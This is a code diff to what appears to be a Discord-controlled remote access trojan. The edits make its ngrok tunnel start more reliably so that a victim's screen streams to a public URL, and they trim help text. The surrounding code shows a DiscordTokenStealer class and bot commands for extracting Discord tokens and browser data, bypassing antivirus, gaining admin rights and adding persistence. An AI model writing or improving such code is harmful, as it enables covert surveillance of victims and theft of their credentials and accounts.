@@ -343,14 +343,50 @@ def start_ngrok(ngrok_path):
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                    text=True, creationflags=subprocess.CREATE_NO_WINDOW)
     
-    for line in iter(ngrok_process.stdout.readline, ''):
-        if "url=" in line and "https://" in line:
+    timeout = 30
+    start_time = time.time()
+    
+    while time.time() - start_time < timeout:
+        if ngrok_process.poll() is not None:
+            break
+            
+        line = ngrok_process.stdout.readline()
+        if not line:
+            time.sleep(0.1)
+            continue
+            
+        print(f"Ngrok output: {line.strip()}")
+        
+        if "started tunnel" in line.lower() and "https://" in line:
+            parts = line.split()
+            for part in parts:
+                if part.startswith("https://") and ".ngrok" in part:
+                    ngrok_url = part.strip()
+                    break
+        elif "url=" in line and "https://" in line:
             url_start = line.find("https://")
             url_end = line.find(" ", url_start)
             if url_end == -1:
                 url_end = len(line)
-            ngrok_url = line[url_start:url_end].strip()
+            potential_url = line[url_start:url_end].strip()
+            if ".ngrok" in potential_url:
+                ngrok_url = potential_url
+                
+        if ngrok_url:
             break
+    
+    if not ngrok_url:
+        time.sleep(5)
+        try:
+            response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
+            data = response.json()
+            if data.get("tunnels"):
+                for tunnel in data["tunnels"]:
+                    if tunnel.get("public_url", "").startswith("https://"):
+                        ngrok_url = tunnel["public_url"]
+                        break
+        except:
+            pass
     
     return ngrok_url
 
@@ -411,14 +447,9 @@ async def live(ctx):
         ngrok_url = await loop.run_in_executor(None, start_ngrok, ngrok_path)
         
         if ngrok_url:
-            embed = discord.Embed(
-                title="Screen Stream Active",
-                description=f"Your screen is now live at:\n{ngrok_url}",
-                color=0x00ff00
-            )
-            await ctx.send(embed=embed)
+            await ctx.send(f"Screen Stream Active!\nYour screen is now live at: {ngrok_url}")
         else:
-            await ctx.send("Failed to start ngrok tunnel. Make sure you set your auth token with !key")
+            await ctx.send("Failed to start ngrok tunnel. Check your auth token or try again.")
     
     except Exception as e:
         await ctx.send(f"Error starting stream: {str(e)}")
@@ -439,19 +470,9 @@ async def status(ctx):
     global flask_thread, ngrok_url
     
     if flask_thread and flask_thread.is_alive() and ngrok_url:
-        embed = discord.Embed(
-            title="Stream Status: ACTIVE",
-            description=f"Live URL: {ngrok_url}",
-            color=0x00ff00
-        )
+        await ctx.send(f"Stream Status: ACTIVE\nLive URL: {ngrok_url}")
     else:
-        embed = discord.Embed(
-            title="Stream Status: INACTIVE",
-            description="Use !live to start streaming",
-            color=0xff0000
-        )
-    
-    await ctx.send(embed=embed)
+        await ctx.send("Stream Status: INACTIVE\nUse !live to start streaming")
 
 class DiscordTokenStealer:
     @staticmethod
@@ -1018,9 +1039,6 @@ async def help(ctx):
 !recent [browser] - Browser history
 !discord - Extract Discord tokens
 !browsers - Extract browser data
-!live - Start screen streaming (you need to set !key first)
-!stop - Stop the stream
-!status - Check if stream is running
 
 **Other:**
 !msg <message> - Show message box
@@ -1030,7 +1048,6 @@ async def help(ctx):
 !su - Request admin privileges
 !avbypass - Bypass antivirus
 !persist - Add persistence
-!key <your_ngrok_auth_token> - Set your ngrok auth token (get from ngrok.com, easy and free)
 
 {watermark()}
 """
